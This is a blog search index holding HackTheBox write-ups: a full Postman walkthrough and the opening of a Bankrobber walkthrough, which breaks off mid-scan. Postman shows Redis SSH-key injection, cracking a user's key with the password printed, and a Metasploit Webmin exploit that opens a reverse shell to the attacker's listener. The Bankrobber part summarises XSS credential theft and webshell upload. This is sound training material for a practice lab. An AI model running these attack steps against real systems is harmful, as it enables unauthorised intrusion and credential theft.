<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>HackTheBox - Postman</title>
      <link href="/2020-03-13/HackTheBox-Postman/"/>
      <url>/2020-03-13/HackTheBox-Postman/</url>
      
        <content type="html"><![CDATA[<p><img src="/img/postman/postman1.png" alt="HackTheBox-Postman/postman.png" title="Postman details"></p><h2 id="Quick-Summary"><a href="#Quick-Summary" class="headerlink" title="Quick Summary"></a>Quick Summary</h2><p>   → This easy machine is very fit to all beginners to learn the basic of Penetration Testing. The machine have a vulnerable software – <code>Redis</code>.<br>   Redis is unprotected without a password set up, and so forth. The simplest thing you can do in such a case, is to write random file such as SSH keys which i’ll use to get in into the machine. After getting the shell, there’s SSH key for user Matt. The machine is very straightforward to the root after you get the credentials of the user and use it for another vulnerability – <code>CVE Webmin 1.910</code>.</p><h2 id="Penetration-Testing-Methodologies"><a href="#Penetration-Testing-Methodologies" class="headerlink" title="Penetration Testing Methodologies"></a>Penetration Testing Methodologies</h2><ol><li><p><strong>Network Scanning</strong></p><p>→ Nmap scan</p><p>→ discover open ports and what services are running</p></li><li><p><strong>Enumeration</strong></p><p>→ Browsing the HTTP Service on different ports</p><p>→ Bruteforce the Web page directories</p><p>→ Check the software vulnerabilities</p></li><li><p><strong>Post - Exploitation</strong></p><p>→ Check if we can inject or put some file inside in the Redis</p><p>→ The goal is to transfer SSH keys</p><p>→ Get in into redis shell</p></li><li><p><strong>Exploitation</strong></p><p>→ Find some interesting things using <code>LinEnum.sh</code> that can use for Exploitation</p><p>→ Get the backup SSH key of a user</p><p>→ Use the credentials for <code>CVE Webmin 1.910</code></p><p>→ Get the root shell</p></li></ol><hr><h2 id="Network-Scanning"><a href="#Network-Scanning" class="headerlink" title="Network Scanning"></a>Network Scanning</h2><h3 id="Walkthrough"><a href="#Walkthrough" class="headerlink" title="Walkthrough"></a>Walkthrough</h3><p>→ First, I run the <strong>Nmap</strong> to scan the target and get information about the various services that are running on the target machine. I use</p><hr><ul><li>-sV      ⇒ Probe open ports to determine service/version info</li><li>-sC      ⇒ equivalent to —script=default</li><li>-T 0-5   ⇒ Set timing template - higher is faster (less accurate)</li><li>-p-      ⇒ Scan all 65535 ports</li><li>-oN      ⇒ to save our scan results to a text file</li></ul><hr><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"><span class="string">nmap</span> <span class="string">-sV</span> <span class="string">-sC</span> <span class="string">-T4</span> <span class="string">-p-</span> <span class="number">10.10</span><span class="number">.10</span><span class="number">.154</span> <span class="string">-oN</span> <span class="string">nmap-postman</span></span><br></pre></td></tr></table></figure><h3 id="Nmap-results"><a href="#Nmap-results" class="headerlink" title="Nmap results"></a>Nmap results</h3><p>So there’s port open.</p><ul><li>22           ⇒ running on OpenSSH 7.6p1</li><li>80        ⇒ running on Apache/2.24.49</li><li>6379      ⇒ running on Redis key-value version 4.0.9</li><li>10000     ⇒ running on MiniServ 1.910 (Webmin httpd)</li></ul><p><img src="/img/postman/nmap-postman.png" alt="HackTheBox-Postman/nmap-postman.png" title="Nmap Postman"></p><hr><h2 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h2><p>I visited the web page in port 80 and there’s nothing interesting stuffs here except the <code>Postman@htb</code> so added it into my <code>/etc/hosts/</code></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">10.10.10.160postman.htb</span><br></pre></td></tr></table></figure><p><img src="/img/postman/postman-webpage.gif" alt="HackTheBox-Postman/postman-webpage.gif" title="Webpage of Postman"></p><h3 id="Scan-the-Web-directories"><a href="#Scan-the-Web-directories" class="headerlink" title="Scan the Web directories"></a>Scan the Web directories</h3><p>So, since I don’t have any clue what is on the Web page, I use <a href="https://github.com/maurosoria/dirsearch" target="_blank" rel="noopener">dirsearch</a> <code>Web path scanner</code> to find some stuffs with the following command.</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/postman </span><br><span class="line">❯ python3 /opt/dirsearch/dirsearch.py -u <span class="string">"http://10.10.10.160"</span> -e asd -x 403,404 --simple-report=postman-directories</span><br></pre></td></tr></table></figure><p><img src="/img/postman/postman-dirsearch.png" alt="HackTheBox-Postman/postman-dirsearch.png" title="Dirsearch"></p><p>So I have this following directories, everything is a normal web directories except on the <code>/upload/</code> directory which caught my attention.</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">[07:32:03] 301 -  310B  - /css  -&gt;  http://10.10.10.160/css/                                                      </span><br><span class="line">[07:32:18] 301 -  312B  - /fonts  -&gt;  http://10.10.10.160/fonts/                                      </span><br><span class="line">[07:32:24] 301 -  313B  - /images  -&gt;  http://10.10.10.160/images/     </span><br><span class="line">[<span class="number">07</span>:<span class="number">32</span>:<span class="number">26</span>] <span class="number">200</span> -    <span class="number">4</span>KB - /index.html                                                                          </span><br><span class="line">[07:32:29] 301 -  309B  - /js  -&gt;  http://10.10.10.160/js/                                              </span><br><span class="line">[07:33:26] 301 -  313B  - /upload  -&gt;  http://10.10.10.160/upload/</span><br><span class="line"></span><br><span class="line">[<span class="number">07</span>:<span class="number">33</span>:<span class="number">26</span>] <span class="number">200</span> -    <span class="number">8</span>KB - /upload/</span><br></pre></td></tr></table></figure><p>Going to the <code>/upload/</code> directory we will see a lot of image there. I tried to look fo the interesting image’ but I realize that this one is a rabbit hole so moved on and go the next phase.</p><h3 id="Upload-page"><a href="#Upload-page" class="headerlink" title="Upload page"></a>Upload page</h3><p><img src="/img/postman/postman-upload.png" alt="HackTheBox-Postman/postman-upload.png" title="Upload directory"></p><h3 id="Webmin-1-910"><a href="#Webmin-1-910" class="headerlink" title="Webmin 1.910"></a>Webmin 1.910</h3><p>Next is to visit the <code>Port 10000</code> which holding an <code>HTTP</code> service – <code>Miniserv 1.910 (Webmin httpd)</code></p><p><img src="/img/postman/postman-webmin.png" alt="HackTheBox-Postman/postman-webmin.png" title="Webmin 1.910"></p><p>I search the <code>webmin</code> version that runs on the machine to look if there’s an existing exploit and there is.</p><p><a href="https://www.rapid7.com/db/modules/exploit/linux/http/webmin_packageup_rce" target="_blank" rel="noopener">Webmin Package Updates Remote Code Execution</a>.</p><p>   →  Description: This module exploits an arbitrary command execution vulnerability in Webmin 1.910 and lower versions. Any user authorized to the “Package Updates” module can execute arbitrary commands with root privileges.</p><p>Since I don’t have any credentials that will use on that exploits, i will leave this for a while and moved on to the next phase of hunting.</p><hr><h2 id="Post-Exploitation"><a href="#Post-Exploitation" class="headerlink" title="Post Exploitation"></a>Post Exploitation</h2><p>Next is to try Redis that appear on my nmap scan.<br>→ Redis is an open source (BSD licensed), in-memory data structure store, used as a database, cache and message broker.</p><p>I used the <a href="https://packages.debian.org/stretch/redis-tools" target="_blank" rel="noopener">redis-tools package</a> to communicate to the service of Redis. The existing vulnerability in version 4.0.9, you can interact redis without username and password.</p><p>So, to start let’s check if I can access the instance, which is a prerequisite:</p><h3 id="Communicate-with-telnet"><a href="#Communicate-with-telnet" class="headerlink" title="Communicate with telnet"></a>Communicate with telnet</h3><p><img src="/img/postman/postman-telnet.png" alt="HackTheBox-Postman/postman-telnet.png" title="Redis Telnet"></p><p>Works, <code>Redis</code> it is unprotected without a password set up.</p><p>Next is to try the <code>redis-cli</code> to look if i’ll got something.</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/postman </span><br><span class="line">❯ redis-cli -h 10.10.10.160</span><br><span class="line">10.10.10.160:6379&gt; get s-key</span><br><span class="line"><span class="string">"\n\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC0+WZO2fM8J6HgUa5kgmE4xQwjMbiWFUYOND+7Qpm6a4XmJM6NABlIOUTe5FnUx+KZmcHlAenOqVdDPsa9rE1G9vZVi8OSFNJ6xplYzyFD9pzyFJ+e2Zz6c6RD2uptE9meJAiE+RQFpNM5TqZgpmlYGG1fi/2Pgtud7I0Lj95S/lRWqtvVN6uK44lKWru+YYwGtA+3unG+0lgRJrC+58+VFV/Cm54ZvJUd/I/4Q08ij6qx4AD1Y0xQqWKoDZMvb0kluzIRcvaYrTEKaFhxVpliVlqP6U3HFgeVZ2AJB redis@server\n\n\n\n"</span></span><br><span class="line">10.10.10.160:6379&gt;</span><br></pre></td></tr></table></figure><p>By using <code>get s-key</code> command inside <code>redis</code> it shows that there’s an existing ssh key that use for authentication. As a redis user shell I can write something in the database to a file with <code>SAVE</code> command. So I was thinking if I can put mine to get in.</p><h3 id="Inject-SSH-Keys"><a href="#Inject-SSH-Keys" class="headerlink" title="Inject SSH Keys"></a>Inject SSH Keys</h3><p>Since the <code>Redis</code> is not protected. I will try to write something into ~/.ssh/authorized_keys in order to gain access to shell. So i will generate my <code>SSH Key</code> first and save into my postman directory.</p><p><code>OPENSSH Key</code> will not valid. To get this work I’ll need <code>RSA PRIVATE Key</code> using this line I can push my ssh-key into private key.</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">ssh-keygen -m PEM -t rsa -b 4096 -C bunny@lanaya</span><br></pre></td></tr></table></figure><p><strong>Generated SSH Key</strong></p><p><img src="/img/postman/postman-rsa-keys.png" alt="HackTheBox-Postman/postman-rsa-keys.png" title="Payas0 RSA Private Key"></p><p>Now I’ve a key. My goal is to put it into the Redis server memory, and later to transfer it into a file, in a way that the resulting authorized_keys file is still a valid one.</p><p>So’ by following this <a href="https://ebook.konfigurasi.net/Security/Kali_Linux_An_Ethical_Hacker' target="_blank" rel="noopener"s_Cookbook.pdf">method</a> I will now put my generated ssh-key.</p><p><img src="/img/postman/postman-flushall.png" alt="HackTheBox-Postman/postman-flushall.png" title="Inject SSH Keys"></p><p>Now Let’s now put my SSH Key into the <code>Redis</code>.<br>Using <code>redis-cli</code> I can check, set a directory for redis and save.</p><p><img src="/img/postman/postman-config.png" alt="HackTheBox-Postman/postman-config.png" title="Inject SSH Keys"></p><p>I’ve successfully save my SSH key. Now I’ll try to login with ssh.</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/postman </span><br><span class="line">❯ ssh -v -i id_rsa redis@10.10.10.160</span><br><span class="line">OpenSSH_8.1p1 Debian-1, OpenSSL 1.1.1d  10 Sep 2019</span><br><span class="line">debug1: Reading configuration data /etc/ssh/ssh_config</span><br><span class="line">debug1: /etc/ssh/ssh_config line 19: Applying options <span class="keyword">for</span> *</span><br><span class="line">debug1: Connecting to 10.10.10.160 [10.10.10.160] port 22.</span><br><span class="line">debug1: Connection established.</span><br><span class="line">debug1: identity file id_rsa <span class="built_in">type</span> 0</span><br><span class="line">debug1: identity file id_rsa-cert <span class="built_in">type</span> -1</span><br><span class="line">debug1: Local version string SSH-2.0-OpenSSH_8.1p1 Debian-1</span><br><span class="line">debug1: Remote protocol version 2.0, remote software version OpenSSH_7.6p1 Ubuntu-4ubuntu0.3</span><br><span class="line">debug1: match: OpenSSH_7.6p1 Ubuntu-4ubuntu0.3 pat OpenSSH_7.0*,OpenSSH_7.1*,OpenSSH_7.2*,OpenSSH_7.3*,OpenSSH_7.4*,OpenSSH_7.5*,OpenSSH_7.6*,OpenSSH_7.7* compat 0x04000002</span><br><span class="line">debug1: Authenticating to 10.10.10.160:22 as <span class="string">'redis'</span></span><br><span class="line">debug1: SSH2_MSG_KEXINIT sent</span><br><span class="line">debug1: SSH2_MSG_KEXINIT received</span><br><span class="line">debug1: kex: algorithm: curve25519-sha256</span><br><span class="line">debug1: kex: host key algorithm: ecdsa-sha2-nistp256</span><br><span class="line">debug1: kex: server-&gt;client cipher: chacha20-poly1305@openssh.com MAC: &lt;implicit&gt; compression: none</span><br><span class="line">debug1: kex: client-&gt;server cipher: chacha20-poly1305@openssh.com MAC: &lt;implicit&gt; compression: none</span><br><span class="line">debug1: expecting SSH2_MSG_KEX_ECDH_REPLY</span><br><span class="line">debug1: Server host key: ecdsa-sha2-nistp256 SHA256:kea9iwskZTAT66U8yNRQiTa6t35LX8p0jOpTfvgeCh0</span><br><span class="line">debug1: Host <span class="string">'10.10.10.160'</span> is known and matches the ECDSA host key.</span><br><span class="line">debug1: Found key <span class="keyword">in</span> /root/.ssh/known_hosts:3</span><br><span class="line">debug1: rekey out after 134217728 blocks</span><br><span class="line">debug1: SSH2_MSG_NEWKEYS sent</span><br><span class="line">debug1: expecting SSH2_MSG_NEWKEYS</span><br><span class="line">debug1: SSH2_MSG_NEWKEYS received</span><br><span class="line">debug1: rekey <span class="keyword">in</span> after 134217728 blocks</span><br><span class="line">debug1: Will attempt key: id_rsa RSA SHA256:RHbmsaWNCcKp3yQZ5DzJzY7qtBWYIMl5z5h3BT1dbP8 explicit</span><br><span class="line">debug1: SSH2_MSG_EXT_INFO received</span><br><span class="line">debug1: kex_input_ext_info: server-sig-algs=&lt;ssh-ed25519,ssh-rsa,rsa-sha2-256,rsa-sha2-512,ssh-dss,ecdsa-sha2-nistp256,ecdsa-sha2-nistp384,ecdsa-sha2-nistp521&gt;</span><br><span class="line">debug1: SSH2_MSG_SERVICE_ACCEPT received</span><br><span class="line">debug1: Authentications that can <span class="built_in">continue</span>: publickey,password</span><br><span class="line">debug1: Next authentication method: publickey</span><br><span class="line">debug1: Offering public key: id_rsa RSA SHA256:RHbmsaWNCcKp3yQZ5DzJzY7qtBWYIMl5z5h3BT1dbP8 explicit</span><br><span class="line">debug1: Server accepts key: id_rsa RSA SHA256:RHbmsaWNCcKp3yQZ5DzJzY7qtBWYIMl5z5h3BT1dbP8 explicit</span><br><span class="line">debug1: Authentication succeeded (publickey).</span><br><span class="line">Authenticated to 10.10.10.160 ([10.10.10.160]:22).</span><br><span class="line">debug1: channel 0: new [client-session]</span><br><span class="line">debug1: Requesting no-more-sessions@openssh.com</span><br><span class="line">debug1: Entering interactive session.</span><br><span class="line">debug1: pledge: network</span><br><span class="line">debug1: client_input_global_request: rtype hostkeys-00@openssh.com want_reply 0</span><br><span class="line">debug1: Sending environment.</span><br><span class="line">debug1: Sending env LANG = en_US.utf8</span><br><span class="line">Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-58-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com</span><br><span class="line"> * Management:     https://landscape.canonical.com</span><br><span class="line"> * Support:        https://ubuntu.com/advantage</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> * Canonical Livepatch is available <span class="keyword">for</span> installation.</span><br><span class="line">   - Reduce system reboots and improve kernel security. Activate at:</span><br><span class="line">     https://ubuntu.com/livepatch</span><br><span class="line">Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings</span><br><span class="line"></span><br><span class="line">Last login: Sun Mar 15 00:54:05 2020 from 10.10.15.124</span><br><span class="line">redis@Postman:~$ whoami</span><br><span class="line">redis</span><br></pre></td></tr></table></figure><p>It works! I’ve got now the initial shell.</p><hr><h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><h3 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h3><p>By doing some <code>Recon</code> i’ll use <a href="https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh" target="_blank" rel="noopener">LinEnum.sh</a> – Scripted Local Linux Enumeration &amp; Privilege Escalation Checks.<br>It will help to find weaknesses and save my time to do the Privilege Escalation,  I’ll uploaded it into <code>/tmp/</code> directories of redis and execute it, so:</p><p><img src="/img/postman/postman-linenum.png" alt="HackTheBox-Postman/postman-linenum.png" title="Recon LinEnum"></p><p>At first it will show the system information of Postman machine.</p><h3 id="Shell-user"><a href="#Shell-user" class="headerlink" title="Shell user"></a>Shell user</h3><p>I see the user <code>Matt</code> and also my shell user as Redis.</p><p><img src="/img/postman/postman-users.png" alt="HackTheBox-Postman/postman-users.png" title="Recon LinEnum"></p><h3 id="Backup-private-SSH-Key"><a href="#Backup-private-SSH-Key" class="headerlink" title="Backup private SSH Key"></a>Backup private SSH Key</h3><p>Going deep of recon, there’s a file that caught my attention. Is a backup SSH key of some user. Base on the info that show’ it is owned by user <code>Matt</code></p><p><img src="/img/postman/postman-private-keys.png" alt="HackTheBox-Postman/postman-private-keys.png" title="Recon LinEnum"></p><p>Going to the <code>/opt/</code> directory, I’ll try to transfer <code>id_rsa.bak</code> into my machine but it seems not working, so I used <code>cat</code> to view the content of the file.</p><p><img src="/img/postman/postman-cat-keys.png" alt="HackTheBox-Postman/postman-cat-keys.png" title="Matt SSH Key"></p><h3 id="Cracking-the-HASH"><a href="#Cracking-the-HASH" class="headerlink" title="Cracking the HASH"></a>Cracking the HASH</h3><p>I copy the content of <code>id_rsa.bak</code> into my machine and I use <a href="https://github.com/koboi137/john/blob/bionic/ssh2john.py" target="_blank" rel="noopener">ssh2john</a> to convert and crack it with <a href="https://github.com/magnumripper/JohnTheRipper" target="_blank" rel="noopener">John The Ripper</a></p><p><img src="/img/postman/postman-crack.png" alt="HackTheBox-Postman/postman-crack.png" title="Crack SSH Key"></p><p>Cracking this using <a href="https://github.com/magnumripper/JohnTheRipper" target="_blank" rel="noopener">John The Ripper</a>.</p><p><img src="/img/postman/postman-crack-john.png" alt="HackTheBox-Postman/postman-crack-john.png" title="Crack SSH Key"></p><p>Just only 14 seconds. I’ve got now the password of <code>Matt</code></p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">password:   computer2008</span><br></pre></td></tr></table></figure><h3 id="Login-as-Matt"><a href="#Login-as-Matt" class="headerlink" title="Login as Matt"></a>Login as Matt</h3><p>I may now able to login as <code>Matt</code> and get the <code>user.txt</code></p><p><img src="/img/postman/postman-user.png" alt="HackTheBox-Postman/postman-user.png" title="Matt user shell"></p><h3 id="CVE-Webmin-1-910"><a href="#CVE-Webmin-1-910" class="headerlink" title="CVE Webmin 1.910"></a>CVE Webmin 1.910</h3><p>In the early stage of my Penetration Testing to this machine’ there’s an existing vulnerability – <code>CVE Webmin 1.910</code> that need credentials. I’ll use metasploit to do the exploitation and pick the <code>webmin_packageup_rce</code></p><p><img src="/img/postman/postman-msf.png" alt="HackTheBox-Postman/postman-msf.png" title="Webmin 1.910 Exploit"></p><p>I will use the credentails for Matt and let’s see what will happen ;)</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># metasploit</span></span><br><span class="line"></span><br><span class="line">msf5 &gt; exploit(linux/http/webmin_packageup_rce) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/linux/http/webmin_packageup_rce):</span><br><span class="line"></span><br><span class="line">   Name       Current Setting  Required  Description</span><br><span class="line">   ----       ---------------  --------  -----------</span><br><span class="line">   PASSWORD                    yes       Webmin Password</span><br><span class="line">   Proxies                     no        A proxy chain of format <span class="built_in">type</span>:host:port[,<span class="built_in">type</span>:host:port][...]</span><br><span class="line">   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax <span class="string">'file:&lt;path&gt;'</span></span><br><span class="line">   RPORT      10000            yes       The target port (TCP)</span><br><span class="line">   SSL        <span class="literal">false</span>            no        Negotiate SSL/TLS <span class="keyword">for</span> outgoing connections</span><br><span class="line">   TARGETURI  /                yes       Base path <span class="keyword">for</span> Webmin application</span><br><span class="line">   USERNAME                    yes       Webmin Username</span><br><span class="line">   VHOST                       no        HTTP server virtual host</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (cmd/unix/reverse_perl):</span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   LHOST                   yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT  4444             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Webmin &lt;= 1.910</span><br></pre></td></tr></table></figure><p>base on the options it requires – <code>PASSWORD</code>, <code>RPORT is on default 10000</code>, <code>RHOSTS which is the victim IP (Postman)</code>, <code>SSL (will set to true)</code>, and <code>USERNAME</code> so:</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># metasploit</span></span><br><span class="line"></span><br><span class="line">msf5 exploit(linux/http/webmin_packageup_rce) &gt; <span class="built_in">set</span> PASSWORD computer2008</span><br><span class="line">PASSWORD =&gt; computer2008</span><br><span class="line">msf5 exploit(linux/http/webmin_packageup_rce) &gt; <span class="built_in">set</span> RHOSTS 10.10.10.160</span><br><span class="line">RHOSTS =&gt; 10.10.10.160</span><br><span class="line">msf5 exploit(linux/http/webmin_packageup_rce) &gt; <span class="built_in">set</span> SSL <span class="literal">true</span></span><br><span class="line">SSL =&gt; <span class="literal">true</span></span><br><span class="line">msf5 exploit(linux/http/webmin_packageup_rce) &gt; <span class="built_in">set</span> USERNAME Matt</span><br><span class="line">USERNAME =&gt; Matt</span><br><span class="line">msf5 exploit(linux/http/webmin_packageup_rce) &gt; <span class="built_in">set</span> LHOST 10.10.10.160</span><br><span class="line">LHOST =&gt; 10.10.10.160</span><br><span class="line">msf5 exploit(linux/http/webmin_packageup_rce) &gt; exploit</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.10.15.124:4444 </span><br><span class="line">[+] Session cookie: 6fda9f4ceb95660a3799aaf46bffea37</span><br><span class="line">[*] Attempting to execute the payload...</span><br><span class="line">[*] Command shell session 1 opened (10.10.15.124:4444 -&gt; 10.10.10.160:47708) at 2020-03-15 09:33:49 +0800</span><br><span class="line"></span><br><span class="line">[*] Trying to find binary(python) on target machine</span><br><span class="line">[*] Found python at /usr/bin/python</span><br><span class="line">[*] Using `python` to pop up an interactive shell</span><br></pre></td></tr></table></figure><p>It works! And to upgrade my shell i use <code>import pty</code> using <code>python</code>:</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># python</span></span><br><span class="line"></span><br><span class="line">python -c <span class="string">'import pty; pty.spawn("/bin/bash");'</span></span><br></pre></td></tr></table></figure><hr><h2 id="Root"><a href="#Root" class="headerlink" title="Root"></a>Root</h2><p>Very straightforward – Rooted! Now i can get the <code>root.txt</code> </p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">root@Postman:~<span class="comment"># id</span></span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure><p><img src="/img/postman/postman-rooted.png" alt="HackTheBox-Postman/postman-rooted.png" title="Postman - Rooted!"></p><hr><p>Referrences:<br><a href="https://medium.com/@knownsec404team/rce-exploits-of-redis-based-on-master-slave-replication-ef7a664ce1d0" target="_blank" rel="noopener">https://medium.com/@knownsec404team/rce-exploits-of-redis-based-on-master-slave-replication-ef7a664ce1d0</a><br><a href="https://book.hacktricks.xyz/pentesting/6379-pentesting-redis" target="_blank" rel="noopener">https://book.hacktricks.xyz/pentesting/6379-pentesting-redis</a><br><a href="https://www.rapid7.com/db/modules/exploit/linux/http/webmin_packageup_rce" target="_blank" rel="noopener">https://www.rapid7.com/db/modules/exploit/linux/http/webmin_packageup_rce</a><br><a href="https://ebook.konfigurasi.net/Security/Kali_Linux_An_Ethical_Hacker&#39;s_Cookbook.pdf" target="_blank" rel="noopener">https://ebook.konfigurasi.net/Security/Kali_Linux_An_Ethical_Hacker&#39;s_Cookbook.pdf</a></p>]]></content>
      
      
      <categories>
          
          <category> HackTheBox </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> pentest </tag>
            
            <tag> cve </tag>
            
            <tag> linux </tag>
            
            <tag> ssh </tag>
            
            <tag> retired </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HackTheBox - Bankrobber</title>
      <link href="/2020-02-20/HackTheBox-Bankrobber/"/>
      <url>/2020-02-20/HackTheBox-Bankrobber/</url>
      
        <content type="html"><![CDATA[<p><img src="/img/bank/bank-detail1.png" alt="HackTheBox-Bankrobber/bank-detail.png" title="Bankrobber machine details"></p><h2 id="Quick-Summary"><a href="#Quick-Summary" class="headerlink" title="Quick Summary"></a>Quick Summary</h2><p>   → Insane machine – Bankrobber is a Web Application that vulnerable to <code>XSS</code>, <code>SQL Injection</code> and <code>RCE</code> that I have to exploit to get the Admin credentials by using XSS.<br>   SQL Injection to study how’s the <code>backdoorchecker.php</code> work, do command injection inside the machine from Web Application to get a reverse shell.<br>   Inside the machine’ I did portforwarding to test the E-Coin transfer’ from there I managed to inject RCE and get the root.</p><h2 id="Penetration-Testing-Methodologies"><a href="#Penetration-Testing-Methodologies" class="headerlink" title="Penetration Testing Methodologies"></a>Penetration Testing Methodologies</h2><ol><li><p><strong>Network Scanning</strong></p><p>→ Nmap scan</p><p>→ discover open ports and what services are running</p></li><li><p><strong>Enumeration</strong></p><p>→ Browsing the HTTP Service</p><p>→ MySQL and SMB open</p><p>→ Bruteforce the Web page directories</p></li><li><p><strong>Post - Exploitation</strong></p><p>→ Create account and Login</p><p>→ Transfer any amount of e-coin</p><p>→ Do client side attack</p><p>→ Use XSS to steal admin credentials</p><p>→ Login as admin and find some interesting in the page</p></li><li><p><strong>Exploitation</strong></p><p>→ Found an XSS and SQL Injection vulnerabilites in <code>search.php</code> and <code>backdoorchecker.php</code></p><p>→ Upload a webshell to the server and get a reverse shell</p></li><li><p><strong>Privilege Escalation</strong></p><p>→ Use <a href="https://github.com/carlospolop/winpe" target="_blank" rel="noopener">winPE</a>. or <code>Windows privilege escalation with cmd</code></p><p>→ Looking at running process and active connections inside the machine</p><p>→ Use obfuscated meterpreter and tunnel the network with Portforwarding</p><p>→ Bruteforce the digit code and test the E-coin transfer</p><p>→ Found <code>RCE</code>(Remote Code Execution) in E-coin transfer</p><p>→ Gain the Administrator shell</p></li></ol><hr><h2 id="Network-Scanning"><a href="#Network-Scanning" class="headerlink" title="Network Scanning"></a>Network Scanning</h2><h3 id="Walkthrough"><a href="#Walkthrough" class="headerlink" title="Walkthrough"></a>Walkthrough</h3><p>→ First, I run the <strong>Nmap</strong> to scan the target and get information about the various services that are running on the target machine. I use</p><hr><ul><li>-sV ⇒ Probe open ports to determine service/version info</li><li>-sC ⇒ equivalent to —script=default</li><li>-p- ⇒ Scan all 65535 ports</li><li>-oN ⇒ to save our scan results to a text file</li></ul><hr><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sh</span></span><br><span class="line">nmap -sV -sC -p- 10.10.10.154 -oN nmap-Bankrobber</span><br></pre></td></tr></table></figure><h3 id="Nmap-results"><a href="#Nmap-results" class="headerlink" title="Nmap results"></a>Nmap results</h3><p>Which found opened ports 80, 443, 445 and 3306</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sh</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Bankrobber </span><br><span class="line">❯ nmap -sV -sC -p- nmap-bankrobber -oN 10.10.10.154</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-08 03:12 PST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.154</span><br><span class="line">Host is up (0.23s latency).</span><br><span class="line">Not shown: 996 filtered ports</span><br><span class="line">PORT     STATE SERVICE    VERSION</span><br><span class="line">80/tcp   open  tcpwrapped</span><br><span class="line">|_http-server-header: Apache/2.4.39 (Win64) OpenSSL/1.1.1b PHP/7.3.4</span><br><span class="line">|_http-title: E-coin</span><br><span class="line">443/tcp  open  tcpwrapped</span><br><span class="line">|_http-server-header: Apache/2.4.39 (Win64) OpenSSL/1.1.1b PHP/7.3.4</span><br><span class="line">|_http-title: Bad request!</span><br><span class="line">| ssl-cert: Subject: commonName=localhost</span><br><span class="line">| Not valid before: 2009-11-10T23:48:47</span><br><span class="line">|_Not valid after:  2019-11-08T23:48:47</span><br><span class="line">|_ssl-date: TLS randomness does not represent time</span><br><span class="line">| tls-alpn: </span><br><span class="line">|_  http/1.1</span><br><span class="line">445/tcp  open  tcpwrapped</span><br><span class="line">3306/tcp open  tcpwrapped</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Device <span class="built_in">type</span>: general purpose|phone</span><br><span class="line">Running (JUST GUESSING): Microsoft Windows 2008|10|Phone (90%)</span><br><span class="line">OS CPE: cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_10 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows</span><br><span class="line">Aggressive OS guesses: Microsoft Windows Server 2008 R2 (90%), Microsoft Windows 10 1511 - 1607 (85%), Microsoft Windows 8.1 Update 1 (85%), Microsoft Windows Phone 7.5 or 8.0 (85%)</span><br><span class="line">No exact OS matches <span class="keyword">for</span> host (<span class="built_in">test</span> conditions non-ideal).</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: mean: 1h02m13s, deviation: 0s, median: 1h02m13s</span><br><span class="line">|_smb-os-discovery: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">| smb-security-mode: </span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: disabled (dangerous, but default)</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   2.02: </span><br><span class="line">|_    Message signing enabled but not 